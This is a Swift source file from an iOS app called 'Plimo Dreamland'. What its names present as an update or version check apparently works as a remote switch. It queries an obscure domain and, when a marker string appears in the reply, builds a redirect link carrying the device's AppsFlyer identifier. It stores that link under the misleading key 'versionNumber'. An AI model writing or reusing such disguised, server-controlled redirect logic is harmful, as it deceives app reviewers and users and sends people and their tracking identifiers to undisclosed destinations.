
//  Plimo Dreamland
//
//  Created by Esku on 28.08.2024.
//

import Foundation
import AdSupport
import AppsFlyerLib

public final class SettingsFletter {
    
    private func firstRequest(completion: @escaping (Result<Data, DataManagerError>) -> Void) {
        self.makeUpdatesRequest(completion: completion)
    }

    public func makeUpdatesRequest(completion: @escaping (Result<Data, DataManagerError>) -> Void) {
        guard let url = URL(string: "https://cadcawdpockcandpo.homes/casporte") else {
            completion(.failure(.invalidURLError))
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"

        let session: URLSession = {
            let session = URLSession(configuration: .default)
            session.configuration.timeoutIntervalForRequest = 3.0
            return session
        }()

        let task = session.dataTask(with: request) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                guard (200...299).contains(httpResponse.statusCode) else {
                    completion(.failure(.httpError(httpResponse.statusCode)))
                    return
                }
            }

            if let error = error {
                completion(.failure(.responseError(error.localizedDescription)))
                return
            }

            guard let data = data else {
                completion(.failure(.noDataError))
                return
            }

            completion(.success(data))
        }
        task.resume()
    }

    public func returnUpdateInfo(completion: @escaping (String) -> Void) {
        var resultedString = UserDefaults.standard.string(forKey: "versionNumber")

        if let resultedString = resultedString {
            completion(resultedString)
            return
        }

        self.firstRequest { result in
            let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            let gaid = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""

            switch result {
            case .success(let data):
                let responseString = String(data: data, encoding: .utf8) ?? ""
                if responseString.contains("foprogs") {
                    let link = "\(responseString)?gaid=\(gaid)"
                    UserDefaults.standard.setValue(link, forKey: "versionNumber")
                    completion(link)
                } else {
                    completion(resultedString ?? "")
                }
            case .failure:
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                    completion(resultedString ?? "")
                }
            }
        }
    }
}

public enum DataManagerError: Error {
    case responseError(String)
    case noDataError
    case invalidURLError
    case httpError(Int)
}
